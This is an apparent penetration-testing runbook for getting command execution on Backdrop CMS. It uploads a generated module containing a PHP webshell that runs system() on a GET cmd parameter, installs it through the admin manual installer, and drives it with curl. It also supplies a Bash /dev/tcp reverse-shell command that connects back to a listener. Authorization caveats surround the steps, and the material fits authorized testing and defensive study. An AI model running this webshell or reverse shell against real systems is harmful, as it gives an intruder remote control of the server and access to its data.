# Backdrop module files and direct PHP execution

Use for an authorized Backdrop code-installation test. Require the actual admin session/installation permission, scoped site, selected supported archive format, a unique test artifact and restoration plan. A version string alone is insufficient: this procedure depends on code-install authority, a writable install path and a web server that executes the installed PHP file.

## Generate and package the intended files

The published EDB52021 generator for 1.27.1 creates `shell/shell.info`, `shell/shell.php` and shell.zip locally. Its URL argument is used in printed instructions; it does not log in, upload or test the server. If using an already acquired, reviewed copy, define `python_bin`, `generator`, `base_url` and a **fresh** `build_directory`:

~~~bash
mkdir -- "$build_directory" && (
  cd -- "$build_directory" && "$python_bin" "$generator" "$base_url"
)
~~~

The generator uses fixed names and can overwrite them in its current directory; do not run it in an existing workspace merely to read it. Inspect the produced source/paths and select a unique test module/name before uploading. Its included PHP calls `system` on a GET cmd value; it is executable command capability, not an inert upload marker, and is not itself a reverse-shell client. The metadata and archive names must remain consistent with the intended installed path.

For a manual construction, retain the module directory, matching .info file with Backdrop 1.x/type/name metadata and the reviewed PHP endpoint. A fixed identity probe is useful for first evidence; arbitrary command capability remains an explicit subsequent authorized action. Lint against the intended trusted PHP runtime when available, but do not confuse CLI lint with the web worker's extensions or execution mapping.

If ZIP is unavailable, package the same selected tree with GNU tar. Define `package_parent`, `package_name` and fresh `archive` as the actual build parent, unique module directory and absolute tar.gz output:

~~~bash
tar --create --gzip --file="$archive" --directory="$package_parent" -- "$package_name"
tar --list --verbose --gzip --file="$archive"
~~~

Check both statuses and top-level member paths. Relabeling ZIP bytes does not convert the archive. The relevant PHP extension availability is the server's, not the workstation's.

## Install, trigger and distinguish the effects

Use the observed admin install page and its Manual installation link. With clean URLs unavailable, an observed query route can be `/?q=admin/modules/install`, followed by `/?q=admin/installer/manual`. Query routing and alias names are different layers; a failed clean path is not proof the administrative function is absent. Read the site's supported format list, select the actual upload field and submit through the current session/CSRF contract. Do not invent a multipart parameter or authentication bypass from a screenshot.

Remote project-catalog DNS errors or unavailable ZIP support can block the browser installer without ruling out manual tar installation. Check authorization/extraction errors and installed paths. The success screen's offered enable step is a separate operation; installation has already placed files. A standalone .php file served under the module tree can execute directly even while its CMS module remains disabled, if the web mapping permits it.

Define `endpoint_url` as the verified uploaded PHP path, `headers`/`body` as fresh private output files and `command` as the selected authorized command. For a reviewed endpoint accepting GET cmd, curl can carry the request without a browser:

~~~bash
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --get --data-urlencode "cmd=$command" \
  --dump-header "$headers" --output "$body" \
  --write-out 'status=%{http_code}\n' "$endpoint_url"
~~~

Use the actual authentication requirement for the endpoint; do not assume the install session is required or unnecessary without evidence. An `id` result attributable to the selected command establishes that web execution identity. The CMS administrator need not be root; a worker such as www-data is separate from the admin account. An upload message, HTTP200, empty body or printed expected URL alone establishes none of this.

`system` outputs stdout, can report an exit code through its second argument and can flush output; `shell_exec` returns captured stdout and cannot distinguish every empty success/failure. A long-running command can outlive an HTTP timeout. For a requested callback, start its owned listener first, then choose the verified interpreter/route and track the child; /dev/tcp redirection is Bash-specific. A listener connection and callback `id` are separate evidence from archive installation, and each repeated GET can launch another process. Keep the tested artifact/endpoint and child lifetime recorded; restore/remove only the owned test files and terminate the owned child, verifying each result.

For that explicitly selected callback on a verified Bash-capable web worker, define `receiver_ip` as the owned reachable numeric IPv4 address and `receiver_port` as its selected positive TCP port. Start the matching installed nc listener first. Set the request's command value, then send it through the GET encoding/capture command above:

~~~bash
command="bash -c 'bash -i >& /dev/tcp/$receiver_ip/$receiver_port 0>&1'"
~~~

The inner Bash opens the socket redirection, merges output/error and connects input to it; a generic sh executing these redirections is not equivalent. This executes an interactive child and requires an outbound route. Record the actual receiver peer and in-session identity, not merely a waiting HTTP request. Choose a managed session budget and stop the owned child/listener afterward; do not repeat the GET automatically on timeout.

This is authenticated installation of executable code under the demonstrated conditions, not proof of an unauthenticated flaw, every Backdrop version being vulnerable, or a universal module-enablement bypass. See [Backdrop module installation](https://docs.backdropcms.org/documentation/extend-with-modules), [manual installer](https://docs.backdropcms.org/documentation/project-installer-and-updates), [PHP system](https://www.php.net/manual/en/function.system.php) and [PHP shell_exec](https://www.php.net/manual/en/function.shell-exec.php). The fuller source-generator attribution/history is kept in the intake record.
